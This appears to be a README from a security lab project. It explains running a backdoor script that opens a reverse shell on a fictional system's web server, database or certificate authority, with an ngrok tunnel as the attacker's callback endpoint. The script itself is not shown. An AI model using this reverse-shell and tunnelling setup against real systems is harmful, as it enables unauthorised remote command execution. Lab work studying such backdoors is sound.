# Backdoor Script

Remotely execute commands on the Web Server, the Database and the CA of the system.

## Set Up

Before running the backdoor script, you need to expose a local port to the Internet, making it accessible from the target machine.

Create a TCP tunnel with Ngrok, using your local port `4444` as an example:

```bash
ngrok tcp 4444
```

Ngrok provides a URL and a port, e.g.:

```txt
Forwarding                    tcp://2.tcp.eu.ngrok.io:17179 -> localhost:4444
```

Here, the URL is `2.tcp.eu.ngrok.io` and the port is `17179`.

Then obtain the IP address of the Ngrok URL by using the `dig` command. For instance:

```bash
dig 2.tcp.eu.ngrok.io
```

You might see something like this:

```txt
;; ANSWER SECTION:
2.tcp.eu.ngrok.io.      900     IN      A       3.126.37.18
```

In this case, the IP address is `3.126.37.18`.

## Run

Install the required dependencies:

```bash
pip install -r requirements.txt
```

Then run the backdoor script:

```txt
Usage: ./backdoor.py LOCAL_ATTACKER_PORT REMOTE_ATTACKER_IP REMOTE_ATTACKER_PORT <web|db|ca>
```

The parameters are:

- `LOCAL_ATTACKER_PORT`: The local port for communication with the attacker.
- `REMOTE_ATTACKER_IP`: The IP address the target machine will connect to.
- `REMOTE_ATTACKER_PORT`: The port the target machine will connect to.
- `<web|db|ca>`: The target machine. Choose between `web` for the Web Server, `db` for the Database and `ca` for the CA.

Example:

```bash
./backdoor.py 4444 3.121.18.47 17179 web
```

The script opens a shell on the target machine and allows you to run commands. Exit the shell by typing `exit` or pressing `Ctrl+C`.

### Connecting to Local Containers

The backdoor script is configured by default for the client machine. For use on your machine connecting to local containers, set these environment variables before running the script:

```bash
export WEB_HOST='https://127.0.0.1:8000'
export CA_HOST='https://ca.imovies.ch:8000'
```
